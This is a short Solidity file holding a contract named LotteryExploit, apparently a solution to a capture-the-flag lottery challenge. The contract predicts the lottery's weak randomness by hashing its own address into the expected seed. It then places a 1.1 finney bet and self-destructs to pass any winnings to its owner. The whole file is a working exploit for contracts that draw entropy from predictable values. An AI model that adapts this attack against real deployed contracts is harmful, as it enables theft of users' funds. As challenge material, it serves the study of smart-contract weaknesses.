pragma solidity 0.4.24;

interface Lottery {
    function play(uint256 _seed) external payable;
    function ctf_challenge_add_authorized_sender(address _addr) external;
}

contract LotteryExploit {
    
    address public owner;
    address public victim_addr;
    
    constructor(address addr) public {
        owner = msg.sender;
        victim_addr = addr;
    }
    
    function () payable public {}
    
    function exploit() external payable {
        
        bytes32 entropy = 0;
        bytes32 entropy2 = keccak256(abi.encodePacked(this));
        uint256 seed = uint(entropy^entropy2);
        
        Lottery(victim_addr).play.value(1.1 finney)(seed);
        
        
        selfdestruct(owner);
    }
}
